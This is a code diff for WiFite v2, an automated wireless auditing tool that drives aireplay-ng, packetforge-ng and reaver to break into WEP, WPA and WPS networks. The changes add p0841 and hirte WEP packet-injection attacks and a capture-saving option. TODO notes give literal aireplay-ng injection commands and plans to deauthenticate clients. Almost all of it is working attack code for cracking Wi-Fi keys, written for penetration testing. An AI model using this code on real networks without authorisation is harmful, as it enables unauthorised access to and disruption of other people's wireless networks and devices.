@@ -8,25 +8,36 @@
 	author: derv82 at gmail
 	
 	TODO:
-	 * Command line arguments. Seriously.
+	 * Test injection at startup? (skippable via command-line switch)
 	 
-	 * WEP - ability to pause/skip/continue	 
-	 * Unknown SSID's : Send deauth's (when on fixed channel) to unmask!
+	 * Deauth broadcast/clients on APs with unknown ESSID's when on fixed channel
 	 
-	 * Option to "analyze" or "check" cap files for handshakes.
-	   Shows output from other programs like tshark, cowpatty, pyrit, aircrack.
+	 * WEP:
+	   - ability to pause/skip/continue	 
+	   - option to save .ivs or .cap files for last (if failed) (-save)
+	   - attacks to add (don't forget -m <minbytes>):
+	      interactive: aireplay-ng --interactive -b 00:11:6B:28:30:14 -d ff:ff:ff:ff:ff:ff -t 1 wlan0
+	                        -d > broadcast destination, -t selects packets with ToDS set
+	      p0841:       aireplay-ng --interactive -b 00:11:6B:28:30:14 -d ff:ff:ff:ff:ff:ff -t 1 wlan0
+	      hirte:       aireplay-ng --cfrag -h 00:C0:CA:3E:67:C6 -D mon0
+	     deauth clients to generate new packets if ivs/sec == 0
+	 
+	 * Option to "analyze" or "check" cap files for handshakes - in progress.
 	 
 	 * reaver:
 	 	 MONITOR ACTIVITY!
 	 	 - Enter ESSID when executing
 	 	 - Count PINs tried
 	   - Ensure WPS key attempts have begun. 
-	   - If no attempts can be made, stop attack and print
+	   - If no attempts can be made, stop attack
 	   
 	   - During attack, if no attempts are made within X minutes, stop attack & Print
 	   
-	   - Output when unable to associate:
+	   - Reaver's output when unable to associate:
 	     [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)
+	   - If failed to associate for x minutes, stop attack
+	   
+	   - slowly increase fail-wait (-x) by 30seconds each failure.
 	
 	MIGHTDO:
 	  * WPA - crack (pyrit/cowpatty) (not really important)
@@ -88,14 +99,16 @@ WPA_HANDSHAKE_COWPATTY = True  # Uses more lenient "nonstrict mode" (-2)
 WEP_DISABLE         = False # Flag for ignoring WEP networks
 WEP_PPS             = 600   # packets per second (Tx rate)
 WEP_TIMEOUT         = 600   # Amount of time to give each attack
-WEP_ARP_REPLAY      = True  # Various WEP-based attacks via aireplay-ng
-WEP_CHOPCHOP        = True  #
-WEP_FRAGMENT        = True  #
-WEP_CAFFELATTE      = True  #
+WEP_ARP_REPLAY      = False#True  # Various WEP-based attacks via aireplay-ng
+WEP_CHOPCHOP        = False  #
+WEP_FRAGMENT        = False#True  #
+WEP_CAFFELATTE      = False#True  #
+WEP_P0841           = True
+WEP_HIRTE           = True
 WEP_CRACK_AT_IVS    = 10000 # Number of IVS at which we start cracking
 WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
 WEP_FINDINGS        = []    # List of strings containing info on successful WEP attacks.
-
+WEP_SAVE            = False # Save packets.
 
 # WPS variables
 WPS_DISABLE         = False # Flag to skip WPS scan and attacks
@@ -256,12 +269,12 @@ def main():
 				need_handshake = not wps_attack(iface, t)
 				wpa_total += 1
 			
+			if not need_handshake: wps_success += 1
+			
 			if not WPA_DISABLE and need_handshake:
 				wpa_total += 1
 				if wpa_get_handshake(iface, t, ts_clients):
 					wpa_success += 1
-			else:
-				wpa_success += 1
 			
 		elif t.encryption.find('WEP') != -1:
 			wep_total += 1
@@ -316,8 +329,8 @@ def handle_args():
 	global WPA_DONT_CRACK, WPA_DICTIONARY, WPA_HANDSHAKE_TSHARK, WPA_HANDSHAKE_PYRIT
 	global WPA_HANDSHAKE_AIRCRACK, WPA_HANDSHAKE_COWPATTY
 	global WEP_DISABLE, WEP_PPS, WEP_TIMEOUT, WEP_ARP_REPLAY, WEP_CHOPCHOP, WEP_FRAGMENT
-	global WEP_CAFFELATTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
-	global WPS_DISABLE
+	global WEP_CAFFELATTE, WEP_P0841, WEP_HIRTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
+	global WEP_SAVE, WPS_DISABLE
 	
 	args = argv[1:]
 	if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
@@ -338,13 +351,13 @@ def handle_args():
 				WEP_DISABLE = True
 				set_encrypt = True
 			if   args[i] == '-wpa': 
-				print GR+' [+]'+W+' scanning for '+G+'WPA'+W+' encrypted networks (use '+G+'-wps'+W+' for WPS scan)'
+				print GR+' [+]'+W+' targeting '+G+'WPA'+W+' encrypted networks (use '+G+'-wps'+W+' for WPS scan)'
 				WPA_DISABLE = False
 			elif args[i] == '-wep': 
-				print GR+' [+]'+W+' scanning for '+G+'WEP'+W+' encrypted networks'
+				print GR+' [+]'+W+' targeting '+G+'WEP'+W+' encrypted networks'
 				WEP_DISABLE = False
 			elif args[i] == '-wps': 
-				print GR+' [+]'+W+' scanning for '+G+'WPS-enabled'+W+' networks'
+				print GR+' [+]'+W+' targeting '+G+'WPS-enabled'+W+' networks'
 				WPS_DISABLE = False
 			
 			elif args[i] == '-c':
@@ -365,21 +378,24 @@ def handle_args():
 				i += 1
 				try: TARGET_ESSID = args[i]
 				except ValueError: print R+' [!]'+O+' no ESSID given!'+W
-				else: print GR+' [+]'+W+' targetting ESSID "%s"' % (G+args[i]+W)
+				else: print GR+' [+]'+W+' targeting ESSID "%s"' % (G+args[i]+W)
 			elif args[i] == '-b':
 				i += 1
 				try: TARGET_BSSID = args[i]
 				except ValueError: print R+' [!]'+O+' no BSSID given!'+W
-				else: print GR+' [+]'+W+' targetting BSSID "%s"' % (G+args[i]+W)
+				else: print GR+' [+]'+W+' targeting BSSID "%s"' % (G+args[i]+W)
 			
 			elif args[i] == '-check':
 				i += 1
 				try: capfile = args[i]
-				except ValueError: print R+' [!]'+O+' no cap file given!'+W
+				except IndexError:
+					print R+' [!]'+O+' unable to analyze capture file'+W 
+					print R+' [!]'+O+' no cap file given!\n'+W
+					exit_gracefully(1)
 				else: 
 					if not os.path.exists(capfile): 
-						print R+' [!]'+O+' file not found: '+R+capfile+W
-						print R+' [!]'+O+' unable to analyze capture file!\n'+W
+						print R+' [!]'+O+' unable to analyze capture file!'+W
+						print R+' [!]'+O+' file not found: '+R+capfile+'\n'+W
 						exit_gracefully(1)
 					
 			
@@ -418,11 +434,15 @@ def handle_args():
 				print GR+' [+]'+W+' cowpatty handshake verification '+G+'enabled'+W
 
 			# WEP
-			if not set_wep and args[i] == '-chopchop' or args[i] == 'fragment' or args[i] == 'caffelatte' or args[i] == '-arpreplay':
+			if not set_wep and args[i] == '-chopchop' or args[i] == 'fragment' or \
+			                   args[i] == 'caffelatte' or args[i] == '-arpreplay' or \
+			                   args[i] == '-p0841' or args[i] == '-hirte':
 				WEP_CHOPCHOP   = False
 				WEP_ARPREPLAY  = False
 				WEP_CAFFELATTE = False
 				WEP_FRAGMENT   = False
+				WEP_P0841      = False
+				WEP_HIRTE      = False
 			if args[i] == '-chopchop': 
 				print GR+' [+]'+W+' WEP chop-chop attack '+G+'enabled'+W
 				WEP_CHOPCHOP = True
@@ -435,6 +455,12 @@ def handle_args():
 			if args[i] == '-arpreplay': 
 				print GR+' [+]'+W+' WEP arp-replay attack '+G+'enabled'+W
 				WEP_ARPREPLAY = True
+			if args[i] == '-p0841': 
+				print GR+' [+]'+W+' WEP p0841 attack '+G+'enabled'+W
+				WEP_P0841 = True
+			if args[i] == '-hirte': 
+				print GR+' [+]'+W+' WEP hrite attack '+G+'enabled'+W
+				WEP_HIRTE = True
 			if args[i] == '-nofake': 
 				print GR+' [+]'+W+' ignoring failed fake-authentication '+R+'disabled'+W
 				WEP_IGNORE_FAKEAUTH = False
@@ -452,48 +478,74 @@ def handle_args():
 				except ValueError: print R+' [!]'+O+' invalid value: %s' % (R+args[i]+W)
 				except IndexError: print R+' [!]'+O+' no value given!'+W
 				else: print GR+' [+]'+W+' packets-per-second rate set to %s' % (G+args[i] + " packets/sec"+W)
+			if args[i] == '-save':
+				WEP_SAVE = True
+				print GR+' [+]'+W+' WEP .cap file saving '+G+'enabled'+W
+			
 	except IndexError:
 		print '\nindexerror\n\n'
 	
 	if capfile != '':
 		analyze_capfile(capfile)
 
+def banner():
+	""" 
+		Displays ASCII art of the highest caliber.
+	"""
+	global REVISION
+	print ''
+	print G+"  .;'                     `;,    "
+	print G+" .;'  ,;'             `;,  `;,   "+W+"WiFite v2 r"+str(REVISION)
+	print G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
+	print G+"::   ::   :   "+GR+"( )"+G+"   :   ::   ::  "+GR+"automated wireless auditor"
+	print G+"':.  ':.  ':. "+GR+"/_\\"+G+" ,:'  ,:'  ,:'  "
+	print G+" ':.  ':.    "+GR+"/___\\"+G+"    ,:'  ,:'   "+GR+"designed for backtrack5r1"
+	print G+"  ':.       "+GR+"/_____\\"+G+"      ,:'     "
+	print G+"           "+GR+"/       \\"+G+"             "
+	print W	
+
 
 def help():
 	"""
 		Prints help screen
 	"""
-	print G+'\n wifite'+W+' help\n'
-
-	print ' general'
-	print '\t-i <iface>  \tuse interface for capture [auto]'
-	print '\t-c <chan>   \tchannel to scan for targets on [auto]'
-	print '\t-e <essid>  \ttarget a specific access point by ssid (name) [ask]'
-	print '\t-check <file>\tcheck capfile <file> for handshakes. prints results'
-	print '\n WPA'
-	print '\t-wpa        \tonly target WPA networks (works with -wps -wep) [off]'
-	print '\t-wpat <s>   \ttime to wait for WPA attack to complete (seconds) [300]'
-	print '\t-wpadt <s>  \ttime to wait between sending deauth packets (seconds) [10]'
-	print '\t-strip      \tstrip handshake using tshark or pyrit [off]'
-	print '\t-crack <dic>\tcrack WPA handshakes using <dic> wordlist file [off]'
 	
-	print '\nWPA handshake options (can combine)'
-	print '\t-aircrack   \tverify handshake using aircrack [on]'
-	print '\t-pyrit      \tverify handshake using pyrit [on]'
-	print '\t-tshark     \tverify handshake using tshark [off]'
-	print '\t-cowpatty   \tverify handshake using cowpatty [off]'
+	head    = W
+	sw      = G
+	var     = GR
+	des     = W
+	de      = G
 	
-	print '\nWEP'
-	print '\t-wep        \tonly target WEP networks (works with -wpa and -wps) [off]'
-	print '\t-pps <num>  \tset the number of packets per second to inject [600]'
-	print '\t-weptime <s>\ttime to wait for *each* WEP attack to complete (sec) [600]'
-	print '\t-chopchop   \tuse chopchop attack [on]'
-	print '\t-arpreplay  \tuse arpreplay attack [on]'
-	print '\t-fragment   \tuse fragmentation attack [on]'
-	print '\t-caffelatte \tuse caffe-latte attack [on]'
-	print '\t-nofakeauth \tstop attack if fake authentication fails [off]'
-	print '\t-wepca <n>  \tstart cracking when number of ivs is greater than n [10000]'
-
+	print head+'   COMMANDS'+W
+	print sw+'\t-i '+var+'<iface>  \t'+des+'use interface for capture      '+de+'[auto]'+W
+	print sw+'\t-c '+var+'<chan>   \t'+des+'channel to scan for targets on '+de+'[auto]'+W
+	print sw+'\t-e '+var+'<essid>  \t'+des+'target a specific access point by ssid (name) '+de+'[ask]'+W
+	print ''
+	print sw+'\t-check '+var+'<file>\t'+des+'check capfile <file> for handshakes. prints results\n'+W
+	
+	print head+'\n   WPA'+W
+	print sw+'\t-wpa        \t'+des+'only target WPA networks (works with -wps -wep)   '+de+'[off]'+W
+	print sw+'\t-wpat '+var+'<s>   \t'+des+'time to wait for WPA attack to complete (seconds) '+de+'[300]'+W
+	print sw+'\t-wpadt '+var+'<s>  \t'+des+'time to wait between sending deauth packets (sec) '+de+'[10]'+W
+	print sw+'\t-strip      \t'+des+'strip handshake using tshark or pyrit             '+de+'[off]'+W
+	print sw+'\t-crack '+var+'<dic>\t'+des+'crack WPA handshakes using '+var+'<dic>'+des+' wordlist file    '+de+'[off]'+W
+	print sw+'\t-aircrack   \t'+des+'verify handshake using aircrack '+de+'[on]'+W
+	print sw+'\t-pyrit      \t'+des+'verify handshake using pyrit    '+de+'[on]'+W
+	print sw+'\t-tshark     \t'+des+'verify handshake using tshark   '+de+'[off]'+W
+	print sw+'\t-cowpatty   \t'+des+'verify handshake using cowpatty '+de+'[off]'+W
+	
+	print head+'\n   WEP'+W
+	print sw+'\t-wep        \t'+des+'only target WEP networks (works with -wpa and -wps)  '+de+'[off]'+W
+	print sw+'\t-pps '+var+'<num>  \t'+des+'set the number of packets per second to inject       '+de+'[600]'+W
+	print sw+'\t-weptime '+var+'<s>\t'+des+'time to wait for *each* WEP attack to complete (sec) '+de+'[600]'+W
+	print sw+'\t-chopchop   \t'+des+'use chopchop attack      '+de+'[on]'+W
+	print sw+'\t-arpreplay  \t'+des+'use arpreplay attack     '+de+'[on]'+W
+	print sw+'\t-fragment   \t'+des+'use fragmentation attack '+de+'[on]'+W
+	print sw+'\t-caffelatte \t'+des+'use caffe-latte attack   '+de+'[on]'+W
+	print sw+'\t-nofakeauth \t'+des+'stop attack if fake authentication fails '+de+'[off]'+W
+	print sw+'\t-wepca '+GR+'<n>  \t'+des+'start cracking when number of ivs is greater than n '+de+'[10000]'+W
+	
+	print ''
 
 
 
@@ -637,7 +689,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 	proc = Popen(command, stdout=DN, stderr=DN)
 	
 	time_started = time.time()
-	print ' [+] '+G+'initializing scan'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.'
+	print GR+' [+] '+G+'initializing scan'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.'
 	(targets, clients) = ([], [])
 	try:
 		while True:
@@ -674,7 +726,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 						return ([t],clients)
 			
 			print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
-			      sec_to_hms(time.time() - time_started), G+'scanning'+W, 
+			      GR+sec_to_hms(time.time() - time_started)+W, G+'scanning'+W, 
 			      G+str(len(targets))+W, '' if len(targets) == 1 else 's', 
 			      G+str(len(clients))+W, '' if len(clients) == 1 else 's'),
 			stdout.flush()
@@ -707,7 +759,10 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 	print '   --- -------------------- ----  -----  ----  ------'
 	for i, target in enumerate(targets):
 		print "   %s%2d%s " % (G, i + 1, W),
-		if len(target.ssid) <= 20:
+		if target.ssid == '':
+			p = O+'('+target.bssid+')'+GR+' '+W
+			print '%s' % p.ljust(20),
+		elif len(target.ssid) <= 20:
 			print "%s" % C+target.ssid.ljust(20)+W,
 		else:
 			print "%s" % C+target.ssid[0:17] + '...'+W,
@@ -747,11 +802,11 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 						victims.append(targets[v - 1])
 			elif not r.isdigit() and r.strip() != '':
 				print O+" [!]"+R+" not a number: %s " % (O+r+W)
-			else:
+			elif r != '':
 				victims.append(targets[int(r) - 1])
 		
 	if len(victims) == 0:
-		print O+' [!] '+R+'no targets selected.'+W
+		print O+'\n [!] '+R+'no targets selected.'+W
 		exit_gracefully(0)
 	
 	print ''
@@ -1710,11 +1765,13 @@ def attack_wep(iface, target, clients):
 		Returns True if key was successfully found, False otherwise.
 	"""
 	
-	total_attacks = 3 + (1 if len(clients) > 0 else 0)
+	total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
 	if not WEP_ARP_REPLAY: total_attacks -= 1
 	if not WEP_CHOPCHOP:   total_attacks -= 1
 	if not WEP_FRAGMENT:   total_attacks -= 1
-	if not WEP_CAFFELATTE and len(clients) > 0: total_attacks -= 1
+	if not WEP_CAFFELATTE: total_attacks -= 1
+	if not WEP_P0841:      total_attacks -= 1
+	if not WEP_HIRTE:      total_attacks -= 1
 	
 	if total_attacks <= 0:
 		print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
@@ -1753,13 +1810,15 @@ def attack_wep(iface, target, clients):
 		
 		ivs = 0
 		last_ivs = 0
-		for attack_num in xrange(0, 4):
+		for attack_num in xrange(0, 6):
 			
 			# Skip disabled attacks
 			if   attack_num == 0 and not WEP_ARP_REPLAY: continue
 			elif attack_num == 1 and not WEP_CHOPCHOP:   continue
 			elif attack_num == 2 and not WEP_FRAGMENT:   continue
 			elif attack_num == 3 and not WEP_CAFFELATTE: continue
+			elif attack_num == 4 and not WEP_P0841:      continue
+			elif attack_num == 5 and not WEP_HIRTE:      continue
 			
 			remove_file(temp + 'arp.cap')
 			# Generate the aireplay-ng arguments based on attack_num and other params
@@ -1767,12 +1826,13 @@ def attack_wep(iface, target, clients):
 			if cmd == '': continue
 			proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
 			
-			print ' %s attacking "%s" via' % (GR+sec_to_hms(WEP_TIMEOUT * \
-			                                (total_attacks - attack_num))+W, G+target.ssid+W),
+			print ' %s attacking "%s" via' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G+target.ssid+W),
 			if attack_num == 0:   print G+'arp-replay',
 			elif attack_num == 1: print G+'chop-chop',
 			elif attack_num == 2: print G+'fragmentation',
 			elif attack_num == 3: print G+'caffe-latte',
+			elif attack_num == 4: print G+'p0841',
+			elif attack_num == 5: print G+'hirte',
 			print 'attack'+W
 			
 			print ' %s captured %s ivs @ %s iv/sec' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G+'0'+W, G+'0'+W),
@@ -1837,8 +1897,8 @@ def attack_wep(iface, target, clients):
 					continue
 				
 				# At this point, aireplay has stopped
-				if attack_num == 0 or attack_num == 3:
-					print '\r %s attack failed: %saireplay-ng quit during arp-replay/interactive%s' % (R+current_hms, O, W)
+				if attack_num != 1 and attack_num != 2:
+					print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R+current_hms, O, W)
 					break # Break out of attack's While loop
 				
 				# Check for a .XOR file (we expect one when doing chopchop/fragmentation
@@ -1851,7 +1911,7 @@ def attack_wep(iface, target, clients):
 				
 				remove_file(temp + 'arp.cap')
 				cmd = ['packetforge-ng',
-					     '-arp',
+					     '-0',
 					     '-a', targets.bssid,
 					     '-h', client_mac,
 					     '-k', '192.168.1.2',
@@ -1866,18 +1926,19 @@ def attack_wep(iface, target, clients):
 				if forged_packet == None: result = ''
 				forged_packet = forged_packet.strip()
 				if not forged_packet.find('Wrote packet'):
-					print "\r %s attack failed: unable to forget ARP packet          %s" % (R+current_hms+O, w)
+					print "\r %s attack failed: unable to forget ARP packet               %s" % (R+current_hms+O, w)
 					break
 				
 				# We were able to forge a packet, so let's replay it via aireplay-ng
 				cmd = ['aireplay-ng',
 				       '--arpreplay',
+				       '-b', target.bssid,
 				       '-r', temp + 'arp.cap', # Used the forged ARP packet
 				       '-F', # Select the first packet
 				       iface]
 				proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
 				
-				print '\r %s forged %s! %s...' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
+				print '\r %s forged %s! %s...         ' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
 				replaying = True
 			
 		
@@ -1913,7 +1974,14 @@ def attack_wep(iface, target, clients):
 		
 	except KeyboardInterrupt:
 		print R+'\n (^C)'+O+' WEP attack interrupted'+W
-	
+		
+		if WEP_SAVE:
+			# Save packets
+			save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'
+			copy(temp + 'wep-01.cap', save_as)
+			print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
+			pass
+		
 	if successful:
 		print GR+'\n [0:00:00]'+W+' attack completed: '+G+'success!'+W
 	else:
@@ -1948,8 +2016,12 @@ def wep_fake_auth(iface, target, time_to_display):
 		cmd = ['aireplay-ng',
 		       '-1', '0', # Fake auth, no delay
 		       '-a', target.bssid,
-		       '-T', '1', # Make 1 attempt
-		       iface]
+		       '-T', '1'] # Make 1 attempt
+		if target.ssid != '':
+			cmd.append('-e')
+			cmd.append(target.ssid)
+		cmd.append(iface)
+		
 		proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
 		started = time.time()
 		while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
@@ -2000,6 +2072,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		       '-b', target.bssid,
 		       '-x', str(WEP_PPS), # Packets per second
 		       '-m', '60', # Minimum packet length (bytes)
+		       '-n', '82', # Maxmimum packet length
 		       '-F'] # Automatically choose the first packet
 		if client_mac != '': 
 			cmd.append('-h')
@@ -2025,18 +2098,28 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		cmd.append(iface)
 	
 	elif attack_num == 3:
-		if len(clients) == 0:
-			print R+' [0:00:00] unable to carry out caffe-latte attack: '+O+'no clients'
-			return ''
+		#if len(clients) == 0:
+		#	print R+' [0:00:00] unable to carry out caffe-latte attack: '+O+'no clients'
+		#	return ''
+		# Doesn't actually require specific clients, some new clients may show up after attack begins.
+		cmd = ['aireplay-ng',
+		       '--caffe-latte',
+		       '-b', target.bssid,
+		       iface]
+		
+	elif attack_num == 4:
+		#if len(clients) == 0:
+		#	print R+' [0:00:00] unable to carry out -p0841 attack: '+O+'no clients'
+		#	return ''
+		# Doesn't actually require specific clients, some new clients may show up after attack begins.
 		cmd = ['aireplay-ng',
 		       '--interactive',
 		       '-b', target.bssid,
-		       '-h', clients[0].bssid,
+		       '-c', 'ff:ff:ff:ff:ff:ff',
+		       '-t', '1', # Only select packets with ToDS bit set
 		       '-x', str(WEP_PPS), # Packets per second
-		       '-T', '1', # Minimum packet length (bytes)
 		       '-F',      # Automatically choose the first packet
-		       '-p', '0841',
-		       'iface'] 
+		       '-p', '0841']
 		cmd.append(iface)
 	return cmd
 
@@ -2158,6 +2241,7 @@ def wps_attack(iface, target):
 
 if __name__ == '__main__':
 	try:
+		banner()
 		main()
 	except KeyboardInterrupt: print R+'\n (^C)'+O+' interrupted\n'+W
 	except EOFError:          print R+'\n (^D)'+O+' interrupted\n'+W
